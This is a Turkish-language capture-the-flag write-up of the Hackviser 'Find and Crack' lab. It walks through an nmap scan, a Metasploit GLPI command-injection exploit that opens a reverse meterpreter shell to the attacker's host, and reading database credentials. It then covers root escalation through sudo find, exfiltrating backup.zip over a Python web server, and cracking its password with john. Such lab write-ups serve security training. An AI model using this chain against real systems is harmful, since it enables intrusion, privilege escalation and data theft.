---
title: Find and Crack
date: 2024-03-27 12:23:12 
categories: [Hackviser]
tags: [Warmups]  
image: /images/findandcrack.webp
---

Şifreli dosyaların kırılması, şifreleme algoritmalarının zayıf noktalarının istismar edilmesi veya şifreleme anahtarlarının deneme yanılma yöntemiyle tahmin edilmesiyle gerçekleştirilir.

Açık kaynaklı bir web uygulaması çalışan hedef makinede zafiyet araştırma, sisteme erişim, yetki yükseltme ve şifreli verilere erişim elde etme ile ilgili alıştırmalar yapmak için önerilir.

<a href="https://app.hackviser.com/warmups/find-and-crack">Find and Crack</a>

---

1- Kullanılan BT Varlık Yönetimi ve hizmet masası sistemi yazılımının adı nedir?

Öncelikle nmap taraması başlatalım.

````bash
┌──(root㉿kali)-[~]
└─# nmap -T4 -sV 172.20.1.33 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-30 13:45 EDT
Nmap scan report for 172.20.1.33 (172.20.1.33)
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MySQL 5.5.5-10.5.21-MariaDB-0+deb11u1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
````

http ve mysql servisi çalışıyor.

Siteyi ziyaret edelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/Hackviser/FindandCrack/images/2.png?raw=true)

IT Management butonuna tıkladığımızda `glpi` BT varlık yönetim paneline ulaşıyoruz.

2- Veritabanına bağlanmak için kullanılan kullanıcı adı nedir?

Makineye erişmemiz gerekiyor. Metasploitte arama yaptığımda glpi ile ilgili bir exploit buluyorum.

````bash
┌──(root㉿kali)-[~]
└─# msfconsole
Metasploit tip: Save the current environment with the save command, 
future console restarts will use this environment again
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v6.4.0-dev                           ]
+ -- --=[ 2404 exploits - 1239 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search glpi

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/glpi_htmlawed_php_injection  2022-01-26       excellent  Yes    GLPI htmLawed php command injection
   1    \_ target: Nix Command                        .                .          .      .
   2    \_ target: Linux (Dropper)                    .                .          .      .
   3  exploit/multi/http/glpi_install_rce             2013-09-12       manual     Yes    GLPI install.php Remote Command Execution
````

`exploit/linux/http/glpi_htmlawed_php_injection` modulünü kullanabiliriz.



````bash
msf6 > use 0
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/glpi_htmlawed_php_injection) > show options

Module options (exploit/linux/http/glpi_htmlawed_php_injection):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
   TARGET_URI  /glpi            no        URI where glpi is hosted
   URIPATH                      no        The URI to use for this exploit (default is random)
   VHOST                        no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nix Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/glpi_htmlawed_php_injection) > set lhost 10.8.1.33
lhost => 10.8.1.33
msf6 exploit(linux/http/glpi_htmlawed_php_injection) > set rhosts 172.20.1.33
rhosts => 172.20.1.33
msf6 exploit(linux/http/glpi_htmlawed_php_injection) > run

[*] Started reverse TCP handler on 10.8.1.33:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Executing Nix Command for cmd/unix/python/meterpreter/reverse_tcp
[*] Sending stage (24768 bytes) to 172.20.1.33
[*] Meterpreter session 1 opened (10.8.1.33:4444 -> 172.20.1.33:59126) at 2024-03-30 13:50:33 -0400

meterpreter > 
````

Meterpreter session'ımız açıldı. Bizden istenen bilgiyi bulalım.

`/var/www/html/glpi/config` dizininde `config_db.php` dosyasıda istenen bilgiler mevcut.

````bash
meterpreter > cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpiuser';
   public $dbpassword = 'glpi-password';
   public $dbdefault = 'glpi';
   public $use_timezones = true;
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
````

3- Hangi komut sudo ayrıcalıkları ile çalıştırılabilir?

Bunu öğrenmek için `sudo -l` komutunu kullanabiliriz.

````bash
meterpreter > shell
Process 639 created.
Channel 2 created.
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /bin/find
````

Find komutunu parola olmadan çalıştırabileceğimizi gördük.

4- backup.zip parolası nedir?

````bash
sudo find / -name "backup.zip"
find: ‘/proc/630/task/630/net’: Invalid argument
find: ‘/proc/630/net’: Invalid argument
/root/backup.zip
````

backup.zip dosyası root dizininde yetki yükseltmemiz gerekecek. Find komutu ile nasıl yetki yükselteceğimizi [GTFO](https://gtfobins.github.io/gtfobins/find/) sitesinden öğrenebiliriz.

Kullanacağımız komut `sudo find . -exec /bin/sh \; -quit`

````bash
sudo find . -exec /bin/sh \; -quit
whoami
root
````

Artık backup.zip dosyasına erişimimiz var fakat dosya şifreli ve şifreyi kırmak için makinemize indirmemiz gerekiyor.

Hedef makinede python ile web servisi çalıştırıyorum: `python -m http.server 8080`

Çalıştırdığımız web servisinden dosyayı indirebiliriz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/Hackviser/FindandCrack/images/1.png?raw=true)


Geriye zip dosyasının şifresini kırmak kaldı. Ben JohnTheRipper aracını kullanacağım. Fakat önce zip dosyasının hash'ini almamız gerekiyor bunun için kullancağımız araç zip2john.

````bash
┌──(root㉿kali)-[~/Downloads]
└─# zip2john backup.zip > hash.txt
ver 2.0 efh 5455 efh 7875 backup.zip/monitors.csv PKZIP Encr: TS_chk, cmplen=115, decmplen=256, crc=063C24FE ts=B320 cs=b320 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/computers.csv PKZIP Encr: TS_chk, cmplen=563, decmplen=1817, crc=B96E8061 ts=B312 cs=b312 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/network-devices.csv PKZIP Encr: TS_chk, cmplen=149, decmplen=332, crc=C1C11408 ts=B325 cs=b325 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/printers.csv PKZIP Encr: TS_chk, cmplen=144, decmplen=326, crc=2457D641 ts=B329 cs=b329 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                       
┌──(root㉿kali)-[~/Downloads]
└─# cat hash.txt    
backup.zip:$pkzip$4*1*1*0*8*24*b329*fbcf725d04e4a674a5fad2a37efccec7d216a007113c50ba1abe5b35351a14580b14f3ce*1*0*8*24*b325*78d42b95cd5e5a95e30c16b9f748d14c598efade3469154a1a3da56db5792e3b864db5cb*1*0*8*24*b312*d24c1a34bc884d3220ccc1ecd19bd6dea7baf1da2373ae36087303fd36c5912e6dacfbf7*2*0*73*100*63c24fe*0*46*8*73*b320*a2044185621a592c4c139a57c2f2ab16013bcf476f21fb667ea32793c5fc0d3fdfcedcbfd6cde7289b92b156991587a8f7f293c11a18dfadca2302fdf21fd40607149285086040c8b357ceabc2ebba01ea8973cfd94cc185fdba988ec1de78ff0e2b51bc443422dfbc51569c3eb598cf4835ab*$/pkzip$::backup.zip:monitors.csv, printers.csv, network-devices.csv, computers.csv:backup.zip
````

Artık hash'i kırabiliriz.

````bash
┌──(root㉿kali)-[~/Downloads]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
asdf;lkj         (backup.zip)     
1g 0:00:00:00 DONE (2024-03-30 14:03) 33.33g/s 819200p/s 819200c/s 819200C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````

6- Kimin madencilik yaptığından şüpheleniliyor?

Bulduğumuz şifreyle zip dosyasını açalım. Aradığımız bilgi computers.cvs dosyasında.

`"IT-0004";"Ethan Friedman";"in use";"Lenovo";"Laptop";"Thinkpad 14";"Linux";"suspicious. he may be mining";"HQ";`

![fsoc](/images/fsoc.gif)
